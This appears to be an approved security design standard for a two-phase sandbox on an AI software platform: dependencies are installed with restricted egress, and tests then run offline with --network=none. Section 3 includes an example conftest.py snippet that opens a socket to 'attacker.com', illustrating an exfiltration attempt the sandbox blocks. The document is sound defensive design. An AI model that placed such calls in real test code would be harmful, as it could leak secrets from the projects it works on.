# Two-Phase Dependency Installation & Execution
**Target:** AI-Powered Software Development Platform — Secure Sandbox Execution Architecture (Issue #200 / F20)  
**Date:** November 2026  
**Status:** Approved Standard  

---

## 1. The Necessity of Two-Phase Execution

A naive security control might disable network access permanently across all execution. However, software repositories frequently require installing third-party dependencies (`pytest`, `requests`, `jest`, `lodash`) before test suites can run.

Conversely, running dependency installation and test execution in an unconstrained environment allows test suites to exfiltrate secrets or establish reverse shells.

To resolve this conflict safely, the platform implements a **strict Two-Phase Execution Pipeline**:
- **Phase A (Dependency Installation):** Controlled sandbox environment with restricted network access to package registries, download limits, and short timeouts.
- **Phase B (Offline Execution):** Completely isolated sandbox container executed with `--network=none`.

```
+-------------------------------------------------------------------------------+
|                      TWO-PHASE EXECUTION ARCHITECTURE                         |
|                                                                               |
|   +-----------------------+                                                   |
|   | Repository Workspace  |                                                   |
|   +-----------------------+                                                   |
|               │                                                               |
|               ▼                                                               |
|   +-----------------------+                                                   |
|   |  Manifest Detection   | -> (requirements.txt / package.json)              |
|   +-----------------------+                                                   |
|               │                                                               |
|               ▼                                                               |
|   +-----------------------+                                                   |
|   |       PHASE A         | -> Container: Network Enabled (Outbound only)     |
|   | Dependency Install    |    Command: pip install / npm install             |
|   +-----------------------+    Timeout: 120s, Non-root 10001                  |
|               │                                                               |
|               ▼                                                               |
|   +-----------------------+                                                   |
|   |  Installed Artifacts  | -> Preserved in task workspace                    |
|   +-----------------------+                                                   |
|               │                                                               |
|               ▼                                                               |
|   +-----------------------+                                                   |
|   |       PHASE B         | -> Container: --network=none (ZERO EGRESS)        |
|   |   Offline Testing     |    Command: pytest / npm test                     |
|   +-----------------------+    Read-only rootfs + tmpfs /tmp                  |
|                                                                               |
+-------------------------------------------------------------------------------+
```

---

## 2. Phase A: Controlled Dependency Installation

### 2.1 Manifest Detection
`TwoPhaseExecutionService.detect_manifests` scans the workspace root for supported package configurations:
- **Python:** `requirements.txt`, `requirements-dev.txt`, `pyproject.toml`, `setup.py`, `Pipfile`.
- **Node.js:** `package.json`, `package-lock.json`.

If no manifests are present, Phase A is skipped entirely, transitioning immediately to Phase B.

### 2.2 Execution Guardrails
- **Sandbox Execution Only:** Dependency installation executes inside the container sandbox, **never on the API host**. Python `setup.py` and npm pre/post-install lifecycle scripts can execute arbitrary C/Python/shell code. Confining them to the container neutralizes host infection vectors.
- **Non-Root User:** Runs with UID `10001:10001`.
- **Egress Restrictions:** Only outbound TCP connections to standard package registries (PyPI, npmjs) are permitted. Host internal subnets and metadata services are unreachable.
- **Timeout Ceiling:** Strict 120-second timeout budget. Runaway downloads or compiling steps are terminated immediately.

---

## 3. Phase B: Offline Test Execution

Once dependencies are installed:
1. The container network interface is dismantled via `--network=none`.
2. The test runner (`pytest` or `npm test`) executes against the repository code.
3. If untrusted code attempts to open a network socket:
   ```python
   # Inside tests/conftest.py
   s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
   s.connect(('attacker.com', 443))
   ```
   The kernel returns `[Errno 101] Network is unreachable` or `SocketError` immediately.
4. Output and exit codes are captured, redacted, bounded to 100 KB, and returned to the calling AI agent.

---

## 4. Failure Modes & Recovery

| Failure Scenario | Behavior & Recovery |
|---|---|
| Phase A times out (e.g. huge package download) | Container is killed via `docker kill`. Phase A marked as failed. Bounded repair loop or error telemetry returned. |
| Malicious npm lifecycle script attempts host escape | Blocked by `--cap-drop=ALL`, `--security-opt=no-new-privileges`, and non-root execution. |
| Test suite attempts external network call | Kernel denies connection (`--network=none`). Test fails or records network unreachable without compromising host. |
